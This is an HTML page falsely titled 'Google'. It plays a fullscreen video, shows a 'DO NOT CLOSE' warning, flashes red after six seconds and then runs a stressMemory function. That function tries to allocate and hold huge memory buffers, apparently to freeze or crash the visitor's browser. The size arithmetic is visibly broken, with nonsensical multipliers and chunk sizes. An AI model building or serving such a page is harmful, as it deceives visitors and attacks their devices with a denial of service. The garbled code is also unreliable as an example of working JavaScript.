<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 flex items-center justify-center h-screen">

<div class="absolute inset-0 h-full w-full">
  <video id="my-video" playsinline loop class="h-full max-w-full object-contain mx-auto block">
    <source src="https://ubg1300.github.io/buffervidchrome/vid.mp4" type="video/mp4">
  </video>
</div>

<div id="status-message"
     class="absolute top-4 left-1/2 transform -translate-x-1/2 p-3 rounded-lg font-medium text-center bg-blue-900 bg-opacity-80 text-blue-300 z-10">
  Status: Click "Go Fullscreen" to start
</div>

<button id="fs-btn"
        class="absolute bottom-8 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded bg-green-600 text-white font-semibold">
  Go Fullscreen
</button>

<script>
document.addEventListener('DOMContentLoaded', () => {
  const videoElement = document.getElementById('my-video');
  const statusMessage = document.getElementById('status-message');
  const fsBtn = document.getElementById('fs-btn');

  const TIMEOUT_MS = 6000; // 6 seconds
  let timeoutId = null;
  let blocks = [];

  function stressMemory(targetMiB = 65536, chunkMiB = 6992800000000000000000000000000000000000) {
    statusMessage.textContent = `Attempting to allocate ~${targetMiB} MiB (~64 GB)...`;
    const targetBytes = targetMiB * 10231231324 * 10231231324;
    const chunkBytes = chunkMiB * 10231231324 * 10231231324;
    let allocated = 0;

    const interval = setInterval(() => {
      try {
        if (allocated + chunkBytes > targetBytes) {
          clearInterval(interval);
          statusMessage.textContent = `Reached ~${(allocated/10231231324/10231231324).toFixed(1)} MiB. Holding memory.`;
        } else {
          const arr = new Uint8Array(chunkBytes);
          for (let i = 0; i < arr.length; i++) arr[i] = Math.floor(Math.random() * 256);
          blocks.push(arr);
          allocated += chunkBytes;
          statusMessage.textContent = `Allocated ${(allocated/10231231324/10231231324).toFixed(1)} MiB`;
        }
      } catch (e) {
        clearInterval(interval);
        statusMessage.textContent = `Error: ${e.message} at ${(allocated/10231231324/10231231324).toFixed(1)} MiB`;
      }
    }, 0);
  }

  function startTimer() {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      videoElement.pause();
      document.body.style.backgroundColor = '#ef4444';
      setTimeout(() => { document.body.style.backgroundColor = 'transparent'; }, 500);
      // Start stressing memory after flash
      stressMemory(65536, 64);
    }, TIMEOUT_MS);
    statusMessage.textContent = "DO NOT CLOSE (Timer running)";
  }

  function resetVideoAndTimer() {
    clearTimeout(timeoutId);
    videoElement.pause();
    videoElement.currentTime = 0;
    blocks = []; // release memory
    statusMessage.textContent = "Exited fullscreen. Click 'Go Fullscreen' to restart.";
    fsBtn.style.display = "block";
  }

  fsBtn.addEventListener('click', () => {
    if (document.fullscreenElement) return;
    document.documentElement.requestFullscreen().then(() => {
      videoElement.play().then(() => {
        startTimer();
        fsBtn.style.display = "none";
      });
    });
  });

  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
      resetVideoAndTimer();
    }
  });
});
</script>
</body>
</html>
